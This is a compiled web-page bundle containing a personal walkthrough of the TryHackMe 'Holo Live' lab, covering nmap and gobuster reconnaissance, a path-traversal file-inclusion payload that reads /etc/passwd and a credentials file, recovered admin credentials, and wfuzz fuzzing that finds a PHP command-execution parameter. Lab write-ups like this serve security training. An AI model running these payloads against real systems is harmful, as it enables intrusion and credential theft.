"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[56575],{28453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>t});var o=s(96540);const r={},i=o.createContext(r);function l(e){const n=o.useContext(i);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),o.createElement(i.Provider,{value:n},e.children)}},70851:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>t,default:()=>h,frontMatter:()=>l,metadata:()=>o,toc:()=>d});const o=JSON.parse('{"id":"hacker/tryhackme/hololive","title":"Holo Live","description":"RECON","source":"@site/docs/hacker/tryhackme/hololive.md","sourceDirName":"hacker/tryhackme","slug":"/hacker/tryhackme/hololive","permalink":"/docs/hacker/tryhackme/hololive","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/hololive.md","tags":[],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1771617957000,"frontMatter":{},"sidebar":"docsSidebar","previous":{"title":"TryHackMe Attacktive Directory Walkthrough - Active Directory Exploitation Guide","permalink":"/docs/hacker/tryhackme/attacktive"},"next":{"title":"HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide","permalink":"/docs/hacker/hackthebox/traverxec"}}');var r=s(74848),i=s(28453);const l={},t="Holo Live",a={},d=[{value:"RECON",id:"recon",level:2},{value:"ENUMERATE",id:"enumerate",level:3},{value:"NMAP",id:"nmap",level:4},{value:"GOBUSTER VHOST",id:"gobuster-vhost",level:4},{value:"Local File inclusion",id:"local-file-inclusion",level:3},{value:"admin creds",id:"admin-creds",level:3},{value:"Remote Code Execution",id:"remote-code-execution",level:2},{value:"source code analysis",id:"source-code-analysis",level:3},{value:"fuzzing for remote code exec",id:"fuzzing-for-remote-code-exec",level:3}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"holo-live",children:"Holo Live"})}),"\n",(0,r.jsx)(n.h2,{id:"recon",children:"RECON"}),"\n",(0,r.jsx)(n.h3,{id:"enumerate",children:"ENUMERATE"}),"\n",(0,r.jsx)(n.h4,{id:"nmap",children:"NMAP"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-text",children:"DC-SRV01: 10.200.107.30\n\nL-SRV01: 10.200.107.33 # web server + ssh\n\nL-SRV02: 192.168.100.100\n\nS-SRV01\nS-SRV02\n\nPC-FILESRV01\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"# nmap -sV -sC -p- -v -o nmap-hololive-10.200.107.0-24.txt 10.200.107.0/24\n\nScanning 2 hosts [65535 ports/host]\nDiscovered open port 80/tcp on 10.200.107.33\nDiscovered open port 22/tcp on 10.200.107.250\nDiscovered open port 22/tcp on 10.200.107.33\n\n\n# 22/tcp on 10.200.107.250\ndebug1: Local version string SSH-2.0-OpenSSH_8.8p1 Debian-1                                                         \ndebug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.5                        \ndebug1: compat_banner: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.5 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3\n*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"# nmap -sV -sC -p- -v -o nmap-hololive-192.168.100.0-24.txt 192.168.100.0/24\n\n"})}),"\n",(0,r.jsx)(n.h4,{id:"gobuster-vhost",children:"GOBUSTER VHOST"}),"\n",(0,r.jsx)(n.p,{children:"vhost fuzzing."}),"\n",(0,r.jsxs)(n.p,{children:["set ",(0,r.jsx)(n.code,{children:"/etc/hosts"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"10.200.107.33   holo.live www.holo.live dev.holo.live admin.holo.live\n"})}),"\n",(0,r.jsxs)(n.p,{children:["Get this wordlist: ",(0,r.jsx)(n.a,{href:"https://github.com/danielmiessler/SecLists.git",children:"SecLists"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["Do ",(0,r.jsx)(n.code,{children:"gobuster"})," with ",(0,r.jsx)(n.code,{children:"vhost"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"\u2514\u2500$ gobuster vhost -u holo.live -w ~/Documents/Lists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster-hololive-vhost.txt \n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:          http://holo.live\n[+] Method:       GET\n[+] Threads:      10\n[+] Wordlist:     /home/kali/Documents/Lists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:   gobuster/3.1.0\n[+] Timeout:      10s\n===============================================================\n2022/03/20 19:28:03 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: www.holo.live (Status: 200) [Size: 21405]\nFound: dev.holo.live (Status: 200) [Size: 7515] \nFound: admin.holo.live (Status: 200) [Size: 1845]\nFound: gc._msdcs.holo.live (Status: 400) [Size: 422]\nFound: _domainkey.holo.live (Status: 400) [Size: 422]\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"# http://www.holo.live/robots.txt:\n\nUser-Agent: *\nDisallow: /var/www/wordpress/index.php\nDisallow: /var/www/wordpress/readme.html\nDisallow: /var/www/wordpress/wp-activate.php\nDisallow: /var/www/wordpress/wp-blog-header.php\nDisallow: /var/www/wordpress/wp-config.php\nDisallow: /var/www/wordpress/wp-content\nDisallow: /var/www/wordpress/wp-includes\nDisallow: /var/www/wordpress/wp-load.php\nDisallow: /var/www/wordpress/wp-mail.php\nDisallow: /var/www/wordpress/wp-signup.php\nDisallow: /var/www/wordpress/xmlrpc.php\nDisallow: /var/www/wordpress/license.txt\nDisallow: /var/www/wordpress/upgrade\nDisallow: /var/www/wordpress/wp-admin\nDisallow: /var/www/wordpress/wp-comments-post.php\nDisallow: /var/www/wordpress/wp-config-sample.php\nDisallow: /var/www/wordpress/wp-cron.php\nDisallow: /var/www/wordpress/wp-links-opml.php\nDisallow: /var/www/wordpress/wp-login.php\nDisallow: /var/www/wordpress/wp-settings.php\nDisallow: /var/www/wordpress/wp-trackback.php\n\n# http://admin.holo.live/robots.txt\n\nUser-agent: *\nDisallow: /var/www/admin/db.php\nDisallow: /var/www/admin/dashboard.php\nDisallow: /var/www/admin/supersecretdir/creds.txt\n"})}),"\n",(0,r.jsx)(n.p,{children:"NOTE: you need to fuzz ALL domains - admin, www and dev."}),"\n",(0,r.jsxs)(n.p,{children:["on ",(0,r.jsx)(n.code,{children:"dev.holo.live"})," there is ",(0,r.jsx)(n.code,{children:"img.php"}),":"]}),"\n",(0,r.jsx)(n.h3,{id:"local-file-inclusion",children:"Local File inclusion"}),"\n",(0,r.jsxs)(n.p,{children:["We want ",(0,r.jsx)(n.code,{children:"/var/www/admin/supersecretdir/creds.txt"})," from ",(0,r.jsx)(n.code,{children:"admin.holo.live"})," but we're going to go through ",(0,r.jsx)(n.code,{children:"dev.holo.live/img.php"})," instead- cos they're all on the same host, just using vhost."]}),"\n",(0,r.jsxs)(n.p,{children:["If this gets my password: ",(0,r.jsx)(n.code,{children:"localhost/lfi.php?file=file=../../../../../../../../etc/passwd"})]}),"\n",(0,r.jsxs)(n.p,{children:["Then this should land the creds file: ",(0,r.jsx)(n.code,{children:"dev.holo.live/img.php?file=../../../../../../../../var/www/admin/supersecretdir/creds.txt"})]}),"\n",(0,r.jsx)(n.h3,{id:"admin-creds",children:"admin creds"}),"\n",(0,r.jsxs)(n.p,{children:["For ",(0,r.jsx)(n.code,{children:"admin.holo.live"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"I know you forget things, so I'm leaving this note for you:\nadmin:DBManagerLogin!\n- gurag <3\n"})}),"\n",(0,r.jsx)(n.h2,{id:"remote-code-execution",children:"Remote Code Execution"}),"\n",(0,r.jsx)(n.p,{children:"2 methods for finding RCE:"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:['source code analysis i.e. "view source" and see if you can spot the usual suspects ',(0,r.jsx)(n.code,{children:"$_GET['cmd']"}),"."]}),"\n",(0,r.jsx)(n.li,{children:"fuzzing with wfuzz or gobuster"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"source-code-analysis",children:"source code analysis"}),"\n",(0,r.jsxs)(n.p,{children:["Looking at ",(0,r.jsx)(n.code,{children:"view-source:http://admin.holo.live/dashboard.php"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:"Visitors today</h4>\n\x3c!--//if ($_GET['cmd'] === NULL) { echo passthru(\"cat /tmp/Views.txt\"); } else { echo passthru($_GET['cmd']);} --\x3e\n</div>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["This looks dodgy, looks like ",(0,r.jsx)(n.code,{children:"cmd"})," is the parameter it will accept."]}),"\n",(0,r.jsx)(n.h3,{id:"fuzzing-for-remote-code-exec",children:"fuzzing for remote code exec"}),"\n",(0,r.jsx)(n.p,{children:"Option if we maybe don't have source code access."}),"\n",(0,r.jsxs)(n.p,{children:["Lookup ",(0,r.jsx)(n.a,{href:"https://wfuzz.readthedocs.io/en/latest/user/basicusage.html",children:"wfuzz"})," and learn how it works."]}),"\n",(0,r.jsx)(n.p,{children:"Now that you can authN to admin, use cookies for authN wfuzz session."}),"\n",(0,r.jsxs)(n.p,{children:["We have the ",(0,r.jsx)(n.code,{children:"dashboard.php"})," file which we will fuzz for what html parameter it accepts that we can use for Remote Code Execution (RCE)."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:'\u2514\u2500$ wfuzz -u http://admin.holo.live/dashboard.php?FUZZ=ls+-la -b PHPSESSID=21cdlttlafq7klmnrpl3r266vs -w wordlist.txt --hw 2\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://admin.holo.live/dashboard.php?FUZZ=ls+-la\nTotal requests: 7\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                            \n=====================================================================\n\n000000003:   200        394 L    1052 W     15869 Ch    "bolo"                                             \n000000001:   200        394 L    1052 W     15869 Ch    "hash"                                             \n000000007:   200        394 L    1052 W     15869 Ch    "forest"                                           \n000000006:   200        394 L    1052 W     15869 Ch    "last"                                             \n000000002:   200        394 L    1052 W     15869 Ch    "cat"                                              \n000000004:   200        394 L    1052 W     15869 Ch    "dior"                                             \n000000005:   200        407 L    1170 W     16551 Ch    "cmd"                                              \n\nTotal time: 0.871835\nProcessed Requests: 7\nFiltered Requests: 0\nRequests/sec.: 8.029040\n'})}),"\n",(0,r.jsx)(n.p,{children:"Explain:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"-u http://admin.holo.live/dashboard.php?FUZZ=ls"})," trying to find the parameter for ",(0,r.jsx)(n.code,{children:"FUZZ"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"-b PHPSESSID=21cdlttlafq7klmnrpl3r266vs"})," its an admin page and needs an authN."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"-w wordlist.txt"})," wordlist to use."]}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"--hw 2"})}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["My experiment here was a wordlist I know for sure has the correct parameter, so the way to tell the correct from the rest of the results (all returned ",(0,r.jsx)(n.code,{children:"200 OK"}),"), and you can see the returned lines for the ",(0,r.jsx)(n.code,{children:"cmd"})," parameter is different from the rest."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"http://admin.holo.live/dashboard.php?cmd=ls",children:"cmd=ls"})})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}}}]);